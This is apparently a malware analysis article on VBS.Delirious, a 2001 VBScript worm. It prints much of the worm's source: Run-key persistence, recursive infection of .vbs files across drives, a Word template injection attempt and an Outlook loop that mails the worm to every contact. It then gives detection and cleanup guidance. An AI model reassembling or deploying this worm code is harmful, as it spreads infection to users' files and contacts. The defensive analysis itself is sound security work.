# Dissecting VBS.Delirious: A VBScript Prepender with Outlook Mass‑Mailing 🛠️🔍

## Disclaimer
This article is for educational purposes only. The code and techniques discussed should not be used for malicious purposes.

## Introduction
VBS.Delirious is a Windows Script Host (WSH) worm written in VBScript and dated June 28, 2001. It combines several early‑2000s propagation patterns: a simple Run‑key autorun, recursive file infection of local/removable drives (VBS prepending), a noisy attempt to infect Word’s `Normal.dot` via the VBA object model, and email mass‑mailing through the Outlook Object Model (OOM). The code is un‑obfuscated and liberally uses `On Error Resume Next`, which makes outcomes forgiving but also introduces logic errors. Studying the original source reveals how small scripting worms chained filesystem, registry, Office automation, and Outlook to spread without exploits—relying instead on permissive defaults and user behavior.

This write‑up walks through the core logic and highlights quirks that affect real‑world behavior and defender detection opportunities.

## Overview of the Malware 🐛
At launch, the script copies itself to the Windows directory as `Delirious.vbs` and persists by creating an HKLM Run value. It then attempts to verify it is running from that path before performing its payloads. The main actions are:

- Persistence: `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Delire = %WinDir%\Delirious.vbs`.
- File infection: Recursively traverse all fixed/removable drives and prepend the virus body to each `.vbs` that is not already tagged.
- Word macro attempt: Dump its own text into `%SystemRoot%\System32\DeliriousCode.txt` and import it as a component into Word’s `NormalTemplate.VBProject`, then call `Normal.ThisDocument.AutoExec`.
- Email spread: Iterate Outlook AddressLists and send a VBS attachment (`%WinDir%\Delirious.vbs`) to every entry with a themed subject.
- Cosmetic/benign extras: On day 1 of the month, display a message; drop a desktop shortcut `Site_Web.url` pointing to a humor website.

There is no network C2. The spread relies on local filesystem recursion, Office/OOM automation, and user mail clients.

## Section 2 – Source Code Analysis 🔬
The script starts with `On Error Resume Next` and captures its own source into a variable used for prepending. It then performs installation and a validity check before calling the main subroutines.

### Installation and autorun
```vbscript
Set sf = CreateObject("Scripting.FileSystemObject")
Set ws = CreateObject("WScript.Shell")
Set fl = sf.OpenTextFile(WScript.ScriptFullName, 1)
virus = fl.ReadAll

Set win = sf.GetSpecialFolder(0) 'Windows
Set sys = sf.GetSpecialFolder(1) 'System

Set cpy = sf.GetFile(WScript.ScriptFullName)
cpy.Copy win & "\\Delirious.vbs"
ws.RegWrite "HKLM\\...\\Run\\Delire", win & "\\Delirious.vbs"
```
- The script reads its own file into `virus` and copies itself to `%WinDir%\Delirious.vbs`.
- It persists machine‑wide through an HKLM Run value named `Delire`.

Immediately after, the author intends to ensure the script only proceeds when launched from the Windows location:

```vbscript
If cpy <> (win & "\\Delirious.vbs") Then
  MsgBox cpy & " is not a VBS file valid.", vbCritical, cpy
Else
  Disque()
  Word()
  Spread()
  ' ... message and desktop URL creation ...
End If
```
- Bug: `cpy` is a File object; comparing it directly to a string yields a type mismatch in VBScript. Because `On Error Resume Next` is active, the error is swallowed and the conditional may not behave as intended. The likely intention was to compare `WScript.ScriptFullName` (or `cpy.Path`) to `win & "\Delirious.vbs"`. In practice, persistence occurs regardless, but the main payloads might be gated inconsistently depending on interpreter error handling.

### Recursive VBS prepender
```vbscript
Sub Disque()
  If Not sf.FileExists(sys & "\\DeliriousFile.txt") Then
    Set DF = sf.CreateTextFile(sys & "\\DeliriousFile.txt")
    DF.WriteLine "Infected file by VBS.Delirious"
    DF.WriteBlankLines 1
    DF.Close
  End If
  For Each d In sf.Drives
    If d.DriveType = 2 Or d.DriveType = 3 Then liste d.Path & "\\"
  Next
End Sub

Sub infection(dossier)
  For Each F In sf.GetFolder(dossier).Files
    ext = LCase(sf.GetExtensionName(F.Path))
    If ext = "vbs" Then
      Set verif = sf.OpenTextFile(F.Path, 1, False)
      If verif.ReadLine <> "'VBS.Delirious" Then
        tout = verif.ReadAll : verif.Close
        Set inf = sf.OpenTextFile(F.Path, 2, True)
        inf.Write virus : inf.Write tout : inf.Close
        Set DF = sf.OpenTextFile(sys & "\\DeliriousFile.txt", 8, True)
        DF.WriteLine F.Path : DF.Close
      End If
    End If
  Next
End Sub

Sub liste(dossier)
  For Each F In sf.GetFolder(dossier).SubFolders
    infection F.Path
    liste F.Path
  Next
End Sub
```
- Behavior: The worm prepends its source to `.vbs` files that don’t start with the marker comment `'VBS.Delirious`. It logs each infection to `%System%\DeliriousFile.txt`.
- Scope: It traverses all fixed (type 3) and removable (type 2) drives—common in this era for infecting USB/ZIP disks.
- Limitations: No exclusion for large/system folders; recursion may be slow on large trees and will hit access‑denied paths. Errors are silenced by `On Error Resume Next`.

### Attempted Word Normal template infection
```vbscript
Sub Word()
  Set CODE = sf.CreateTextFile(sys & "\\DeliriousCode.txt")
  CODE.Write virus : CODE.Close
  If ws.RegRead("HKLM\\Software\\Microsoft\\Delirious\\InfectNormal") <> "OK" Then
    Set wrd = CreateObject("Word.Application")
    wrd.Visible = False
    Set NorT = wrd.NormalTemplate.VBProject.VBComponents
    NorT.Import sys & "\\DeliriousCode.txt"
    wrd.Run "Normal.ThisDocument.AutoExec"
    wrd.Quit
    ws.RegWrite "HKLM\\Software\\Microsoft\\Delirious\\InfectNormal", "OK"
  End If
End Sub
```
- Intent: Seed Word’s `Normal.dot` with code and trigger `AutoExec`.
- Issues:
  - The file written is the VBScript body, not valid VBA—importing it into a VBA project will not compile.
  - `ThisDocument.AutoExec` under `Normal` is an odd target; typical auto‑macros are `AutoOpen`/`AutoExec` in standard modules.
  - Word security: Access to the VBA project object model is typically blocked unless “Trust access to the VBA project object model” is enabled.
- Net effect: This component is likely ineffective on default configurations.

### Outlook mass‑mailing
```vbscript
Sub Spread()
  WHO = ws.RegRead("HKLM\\...\\RegisteredOwner")
  Set OA = CreateObject("Outlook.Application")
  Set MA = OA.GetNameSpace("MAPI")
  For Each C In MA.AddressLists
    If C.AddressEntries.Count <> 0 Then
      For D = 1 To C.AddressEntries.Count
        Set AD = C.AddressEntries(D)
        Set EM = OA.CreateItem(0)
        EM.To = AD.Address
        EM.Subject = "Delirious EMail from " & WHO
        EM.Body = "Hi " & AD.Name & "," & vbCrLf & _
                   "Look at this funny attached." & vbCrLf & _
                   vbCrLf & "    Best Regards " & WHO
        EM.Attachments.Add win & "\\Delirious.vbs"
        EM.DeleteAfterSubmit = True
        If EM.To <> "" Then EM.Send
      Next
    End If
  Next
End Sub
```
- Behavior: Sends one email per address entry across all Outlook address lists, attaching `%WinDir%\Delirious.vbs`.
- Constraints: Modern Outlook versions prompt or block OOM sends; even in 2001, Outlook Security Update introduced prompts unless trusted AV/COM add‑ins were present. Mail gateways often block `.vbs` attachments.

### Other behaviors
- On the 1st day of the month: Displays a message box (“Look at my new virus ! …”).
- Drops a desktop Internet shortcut: `Site_Web.url` pointing to `http://www.jememarre.com`.

## Section 3 – Mitigation and Defense Strategies 🛡️
- Script execution controls: Disable or restrict Windows Script Host for untrusted users. Use AppLocker/SRP to block `.vbs` execution outside approved paths.
- Registry monitoring: Alert on creation/modification of `HKLM\Software\Microsoft\Windows\CurrentVersion\Run\Delire` pointing to `Delirious.vbs`. Track the marker `HKLM\Software\Microsoft\Delirious\InfectNormal`.
- File telemetry: Watch for `%WinDir%\Delirious.vbs`, `%System%\DeliriousFile.txt`, and `%System%\DeliriousCode.txt`. Flag mass writes to `.vbs` files across multiple drives with identical prepended content.
- Outlook/OOM protections: Enforce the Outlook Object Model Guard (or modern equivalent) to prompt/block programmatic sends and executable attachments. Mail gateways should quarantine/drop `.vbs` attachments.
- Office hardening: Require macro signing, disable access to the VBA project object model, and use Protected View. Even though this specimen’s Word logic is flawed, similar worms use the same APIs effectively.
- Removable media hygiene: Auto‑scan removable drives; monitor for recursive enumeration of `.vbs` files and treat as suspicious.
- EDR/behavior detections:
  - WSH spawning many file writes ending in `.vbs`.
  - Creation of desktop `.url` artifacts by scripts.
  - WSH creating Outlook COM objects and calling `CreateItem`, `Send` in tight loops.
- Response steps: Delete `%WinDir%\Delirious.vbs`; remove the Run value `...\Run\Delire`; delete `DeliriousFile.txt`/`DeliriousCode.txt`; restore infected `.vbs` from backups (or strip the prepended block whose first line is `'VBS.Delirious`); review mail logs for the subject pattern “Delirious EMail from <RegisteredOwner>”.

## Conclusion
VBS.Delirious illustrates the classic scripting‑worm playbook: a copy‑to‑Windows + Run‑key autorun, recursive prepending of same‑language files across local/removable drives, opportunistic Office automation, and Outlook‑based mass mailing. The author’s reliance on `On Error Resume Next` and a few type/logic mistakes dulls its effectiveness, but the broad strokes are the same as many contemporaries. Defenders can reliably detect and stop this class by constraining WSH and OOM automation, blocking script attachments, monitoring Run‑key and `.vbs` churn on disk, and hardening Office. Historical specimens like this remain valuable for understanding propagation logic and adding layered controls that make such worms ineffective on modern systems.